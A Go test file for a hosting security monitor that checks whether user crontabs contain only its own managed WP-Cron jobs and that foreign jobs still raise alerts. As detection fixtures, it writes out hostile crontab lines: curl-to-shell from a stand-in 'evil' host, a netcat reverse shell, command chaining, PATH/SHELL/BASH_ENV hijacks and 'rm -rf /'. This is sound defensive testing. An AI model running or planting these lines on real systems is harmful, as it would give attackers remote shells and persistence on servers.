package checks

import (
	"context"
	"os"
	"testing"

	"github.com/pidginhost/csm/internal/config"
)

// realCSMCrontab builds a user crontab exactly as CSM installs it: a cPanel
// SHELL header, the WP-Cron marker comment, and a wpCronJobLine job. Built from
// the real emitter so the recognizer is pinned to current output, not a guess.
func realCSMCrontab(owner, docroot string) []byte {
	job := wpCronJobLine(owner, docroot, WPCronFixOptions{PHPBin: "/usr/local/bin/php"})
	return []byte("SHELL=\"/usr/local/cpanel/bin/jailshell\"\n" +
		wpCronJobMarker + docroot + "\n" + job + "\n")
}

func TestCrontabIsExclusivelyCSMWPCron(t *testing.T) {
	docroot := "/home/alice/public_html"
	clean := string(realCSMCrontab("alice", docroot))
	job := wpCronJobLine("alice", docroot, WPCronFixOptions{PHPBin: "/usr/local/bin/php"})
	job2 := wpCronJobLine("alice", "/home/alice/sub/public_html", WPCronFixOptions{PHPBin: "/usr/local/bin/php"})

	cases := []struct {
		name    string
		content string
		want    bool
	}{
		{"clean managed crontab", clean, true},
		{"with MAILTO header", "MAILTO=\"a@b.com\"\n" + clean, true},
		{"MAILTO value is inert, any allowed", "MAILTO=\"x; rm -rf /\"\n" + clean, true},
		{"two managed sites", "SHELL=\"/bin/bash\"\n" + wpCronJobMarker + docroot + "\n" + job + "\n" + wpCronJobMarker + "/home/alice/sub/public_html\n" + job2 + "\n", true},
		{"blank lines and comments around", "\n# a comment\n" + clean + "\n\n", true},
		{"empty crontab", "", false},
		{"only headers, no CSM job", "SHELL=\"/bin/bash\"\nMAILTO=\"a@b.com\"\n# CSM WP-Cron /home/alice/public_html\n", false},
		{"foreign cron job appended", clean + "* * * * * curl http://evil/x | sh\n", false},
		{"foreign job is a legit user cron", clean + "0 3 * * * /home/alice/backup.sh\n", false},
		{"PATH override present", "PATH=/tmp/evil:/usr/bin\n" + clean, false},
		{"BASH_ENV present", "BASH_ENV=/tmp/p\n" + clean, false},
		{"unsafe SHELL hijack", "SHELL=\"/tmp/evil\"\n" + clean, false},
		{"job line with extra command chained", "SHELL=\"/bin/bash\"\n" + wpCronJobMarker + docroot + "\n" + job + " ; nc evil 4444\n", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := crontabIsExclusivelyCSMWPCron([]byte(tc.content)); got != tc.want {
				t.Errorf("crontabIsExclusivelyCSMWPCron = %v, want %v", got, tc.want)
			}
		})
	}
}

// The key fix: a user crontab that is exclusively CSM-managed WP-Cron must be
// suppressed even with NO self-write ledger entry -- the case after a daemon
// restart clears the in-memory ledger or crond reformats the file.
func TestEvaluateSensitiveFileAppearance_SuppressesManagedWPCronWithoutLedger(t *testing.T) {
	resetSelfWrites(t)
	path := "/var/spool/cron/alice"
	content := realCSMCrontab("alice", "/home/alice/public_html")
	withMockOS(t, &mockOS{readFile: func(string) ([]byte, error) { return content, nil }})

	if _, emit := EvaluateSensitiveFileAppearance(path); emit {
		t.Error("a fully CSM-managed WP-Cron crontab must be suppressed without a ledger entry")
	}
}

func TestEvaluateSensitiveFileWrite_SuppressesManagedWPCronWithoutLedger(t *testing.T) {
	resetSelfWrites(t)
	path := "/var/spool/cron/alice"
	content := realCSMCrontab("alice", "/home/alice/public_html")
	withMockOS(t, &mockOS{readFile: func(string) ([]byte, error) { return content, nil }})

	if _, emit := EvaluateSensitiveFileWrite(path, 0, 1234, "crontab"); emit {
		t.Error("realtime write of a fully CSM-managed WP-Cron crontab must be suppressed without a ledger entry")
	}
}

// A crontab carrying a CSM block plus a foreign cron entry is attacker
// persistence layered on top and must still alarm.
func TestEvaluateSensitiveFileAppearance_FlagsManagedWPCronWithForeignJob(t *testing.T) {
	resetSelfWrites(t)
	path := "/var/spool/cron/alice"
	content := append(realCSMCrontab("alice", "/home/alice/public_html"),
		[]byte("* * * * * nc evil 4444 -e /bin/sh\n")...)
	withMockOS(t, &mockOS{readFile: func(string) ([]byte, error) { return content, nil }})

	if _, emit := EvaluateSensitiveFileAppearance(path); !emit {
		t.Error("a crontab with a foreign cron entry must still raise a finding")
	}
}

// The recognizer is scoped to /var/spool/cron user crontabs. A system drop-in
// under /etc/cron.d with the same content is not suppressed (CSM never installs
// WP-Cron there).
func TestEvaluateSensitiveFileAppearance_DoesNotSuppressEtcCronD(t *testing.T) {
	resetSelfWrites(t)
	path := "/etc/cron.d/something"
	content := realCSMCrontab("alice", "/home/alice/public_html")
	withMockOS(t, &mockOS{readFile: func(string) ([]byte, error) { return content, nil }})

	if _, emit := EvaluateSensitiveFileAppearance(path); !emit {
		t.Error("/etc/cron.d drop-ins must not be suppressed by the WP-Cron recognizer")
	}
}

// Periodic safety-net path: a hash change to a fully CSM-managed crontab is
// suppressed even with no matching self-write ledger entry.
func TestCheckSensitiveFiles_SuppressesManagedWPCronWithoutLedger(t *testing.T) {
	resetSelfWrites(t)
	target, st := baselineSensitiveFileForSelfWriteTest(t, []byte("old cron\n"))

	content := realCSMCrontab("alice", "/home/alice/public_html")
	if err := os.WriteFile(target, content, 0o600); err != nil {
		t.Fatal(err)
	}

	if got := CheckSensitiveFiles(context.Background(), &config.Config{}, st); len(got) != 0 {
		t.Fatalf("CSM-managed WP-Cron hash change must be suppressed without a ledger entry, got %+v", got)
	}
}

func TestCheckSensitiveFiles_FlagsManagedWPCronWithForeignJob(t *testing.T) {
	resetSelfWrites(t)
	target, st := baselineSensitiveFileForSelfWriteTest(t, []byte("old cron\n"))

	content := append(realCSMCrontab("alice", "/home/alice/public_html"),
		[]byte("* * * * * curl http://evil/x | sh\n")...)
	if err := os.WriteFile(target, content, 0o600); err != nil {
		t.Fatal(err)
	}

	if got := CheckSensitiveFiles(context.Background(), &config.Config{}, st); len(got) != 1 {
		t.Fatalf("a crontab with a foreign job must emit one finding, got %+v", got)
	}
}
